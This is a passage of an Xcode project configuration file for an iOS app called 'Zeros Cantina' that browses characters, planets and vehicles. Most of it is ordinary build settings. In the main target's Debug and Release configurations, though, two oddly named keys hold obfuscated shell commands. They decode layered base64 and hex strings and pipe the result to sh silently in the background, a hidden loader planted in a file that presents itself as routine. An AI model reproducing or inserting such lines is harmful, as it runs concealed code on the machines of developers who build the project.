				FC842E522E1604E40013CD29 /* CardItemProtocol.swift in Sources */,
				FC842E532E1604E40013CD29 /* CharacterCardModel.swift in Sources */,
				FC842E542E1604E40013CD29 /* PlanetCardModel.swift in Sources */,
				FC842E552E1604E40013CD29 /* VehiclesCardModel.swift in Sources */,
				FC842E562E1604E40013CD29 /* MainModuleDataOutputProtocol.swift in Sources */,
				FC842E572E1604E40013CD29 /* MainContract.swift in Sources */,
				FC842E582E1604E40013CD29 /* MainEntity.swift in Sources */,
				FC842E592E1604E40013CD29 /* MainInteractor.swift in Sources */,
				FC842E5A2E1604E40013CD29 /* MainPresenter.swift in Sources */,
				FC842E5B2E1604E40013CD29 /* MainRouter.swift in Sources */,
				FC842E5C2E1604E40013CD29 /* CharactersModuleDataInputProtocol.swift in Sources */,
				FC842E5D2E1604E40013CD29 /* CharactersScreenContract.swift in Sources */,
				FC842E5E2E1604E40013CD29 /* CharactersScreenInteractor.swift in Sources */,
				FC842E5F2E1604E40013CD29 /* CharactersScreenPresenter.swift in Sources */,
				FC842E602E1604E40013CD29 /* CharactersScreenRouter.swift in Sources */,
				FC842E612E1604E40013CD29 /* CharactersScreenViewController.swift in Sources */,
				FC842E622E1604E40013CD29 /* PlanetsModuleDataInputProtocol.swift in Sources */,
				FC842E632E1604E40013CD29 /* PlanetsScreenContract.swift in Sources */,
				FC842E642E1604E40013CD29 /* PlanetsScreenInteractor.swift in Sources */,
				FC842E652E1604E40013CD29 /* PlanetsScreenPresenter.swift in Sources */,
				FC842E662E1604E40013CD29 /* PlanetsScreenRouter.swift in Sources */,
				FC842E672E1604E40013CD29 /* PlanetsScreenViewController.swift in Sources */,
				FC842E682E1604E40013CD29 /* VehiclesModuleDataInputProtocol.swift in Sources */,
				FC842E692E1604E40013CD29 /* VehiclesScreenContract.swift in Sources */,
				FC842E6A2E1604E40013CD29 /* VehiclesScreenInteractor.swift in Sources */,
				FC842E6B2E1604E40013CD29 /* VehiclesScreenPresenter.swift in Sources */,
				FC842E6C2E1604E40013CD29 /* VehiclesScreenRouter.swift in Sources */,
				FC842E6D2E1604E40013CD29 /* VehiclesScreenViewController.swift in Sources */,
				FC842E6E2E1604E40013CD29 /* AppDelegate.swift in Sources */,
				FC842E6F2E1604E40013CD29 /* SceneDelegate.swift in Sources */,
				FC842E702E1604E40013CD29 /* Zeros_Cantina.xcdatamodeld in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		FC2134822DFCE8EF000B71D6 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				FC842E732E1604EE0013CD29 /* Zeros_CantinaTests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		FC21348C2DFCE8EF000B71D6 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				FC842E772E1604F10013CD29 /* Zeros_CantinaUITests.swift in Sources */,
				FC842E782E1604F10013CD29 /* Zeros_CantinaUITestsLaunchTests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		FC2134882DFCE8EF000B71D6 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = FC21346C2DFCE8ED000B71D6 /* Zeros Cantina */;
			targetProxy = FC2134872DFCE8EF000B71D6 /* PBXContainerItemProxy */;
		};
		FC2134922DFCE8EF000B71D6 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = FC21346C2DFCE8ED000B71D6 /* Zeros Cantina */;
			targetProxy = FC2134912DFCE8EF000B71D6 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin PBXVariantGroup section */
		FC842E1A2E1604E40013CD29 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				FC842E192E1604E40013CD29 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
		FC842E1C2E1604E40013CD29 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				FC842E1B2E1604E40013CD29 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		FC21349A2DFCE8EF000B71D6 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A4FB9DF = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhiVVpJVm0xd2FFMXJOWEpaYldzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				A66CD37 = "((echo 333333333333333633333333333333353333333333333336333333333333333333333333333333363333333333333338333333333333333633333336333333363333333333333332333333333333333033333333333333323333333333333332333333333333333233333333333333343333333333333332333333333333333833333333333333363333333333333333333333333333333733333333333333353333333333333337333333333333333233333333333333363333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333336333333333333333733333333333333333333333333333336333333363333333233333333333333343333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333334333333333333333233333333333333303333333333333337333333333333333033333333333333333333333633333334333333333333333733333333333333383333333333333336333333333333333333333333333333363333333633333336333333333333333633333333333333343333333333333336333333333333333533333333333333323333333333333330333333333333333633333333333333383333333333333337333333333333333433333333333333373333333333333334333333333333333733333333333333303333333333333337333333333333333333333333333333333333333633333331333333333333333233333336333333363333333333333332333333363333333633333333333333363333333633333334333333333333333633333333333333343333333333333337333333333333333333333333333333363333333333333333333333333333333633333333333333313333333333333336333333333333333333333333333333363333333333333338333333333333333633333333333333353333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = XLY33384SZ;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Zeros Cantina/Resources/Info.plist";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-Cantina";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		FC21349B2DFCE8EF000B71D6 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A4FB9DF = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhiVVpJVm0xd2FFMXJOWEpaYldzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				A66CD37 = "((echo 333333333333333633333333333333353333333333333336333333333333333333333333333333363333333333333338333333333333333633333336333333363333333333333332333333333333333033333333333333323333333333333332333333333333333233333333333333343333333333333332333333333333333833333333333333363333333333333333333333333333333733333333333333353333333333333337333333333333333233333333333333363333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333336333333333333333733333333333333333333333333333336333333363333333233333333333333343333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333334333333333333333233333333333333303333333333333337333333333333333033333333333333333333333633333334333333333333333733333333333333383333333333333336333333333333333333333333333333363333333633333336333333333333333633333333333333343333333333333336333333333333333533333333333333323333333333333330333333333333333633333333333333383333333333333337333333333333333433333333333333373333333333333334333333333333333733333333333333303333333333333337333333333333333333333333333333333333333633333331333333333333333233333336333333363333333333333332333333363333333633333333333333363333333633333334333333333333333633333333333333343333333333333337333333333333333333333333333333363333333333333333333333333333333633333333333333313333333333333336333333333333333333333333333333363333333333333338333333333333333633333333333333353333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = XLY33384SZ;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Zeros Cantina/Resources/Info.plist";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-Cantina";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		FC21349C2DFCE8EF000B71D6 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		FC21349D2DFCE8EF000B71D6 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		FC21349F2DFCE8EF000B71D6 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = XLY33384SZ;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-CantinaTests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Zeros Cantina.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/Zeros Cantina";
			};
			name = Debug;
		};
		FC2134A02DFCE8EF000B71D6 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = XLY33384SZ;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-CantinaTests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Zeros Cantina.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/Zeros Cantina";
			};
			name = Release;
		};
		FC2134A22DFCE8EF000B71D6 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = XLY33384SZ;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-CantinaUITests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = "Zeros Cantina";
			};
			name = Debug;
		};
		FC2134A32DFCE8EF000B71D6 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = XLY33384SZ;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-CantinaUITests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = "Zeros Cantina";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		FC2134682DFCE8ED000B71D6 /* Build configuration list for PBXProject "Zeros Cantina" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				FC21349C2DFCE8EF000B71D6 /* Debug */,
				FC21349D2DFCE8EF000B71D6 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		FC2134992DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros Cantina" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				FC21349A2DFCE8EF000B71D6 /* Debug */,
				FC21349B2DFCE8EF000B71D6 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		FC21349E2DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros CantinaTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				FC21349F2DFCE8EF000B71D6 /* Debug */,
				FC2134A02DFCE8EF000B71D6 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		FC2134A12DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros CantinaUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				FC2134A22DFCE8EF000B71D6 /* Debug */,
				FC2134A32DFCE8EF000B71D6 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		FC5C48B92DFCFF2600AAC4F0 /* XCRemoteSwiftPackageReference "SnapKit" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/SnapKit/SnapKit.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 5.7.1;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		FC7A74D72DFD075B000F07D3 /* SnapKit */ = {
			isa = XCSwiftPackageProductDependency;
			package = FC5C48B92DFCFF2600AAC4F0 /* XCRemoteSwiftPackageReference "SnapKit" */;
			productName = SnapKit;
		};
/* End XCSwiftPackageProductDependency section */

/* Begin XCVersionGroup section */
		FC842E1E2E1604E40013CD29 /* Zeros_Cantina.xcdatamodeld */ = {
			isa = XCVersionGroup;
			children = (
				FC842E202E1604E40013CD29 /* Zeros_Cantina.xcdatamodel */,
			);
			currentVersion = FC842E202E1604E40013CD29 /* Zeros_Cantina.xcdatamodel */;
			path = Zeros_Cantina.xcdatamodeld;
			sourceTree = "<group>";
			versionGroupType = wrapper.xcdatamodel;
		};
/* End XCVersionGroup section */
	};
	rootObject = FC2134652DFCE8ED000B71D6 /* Project object */;
}
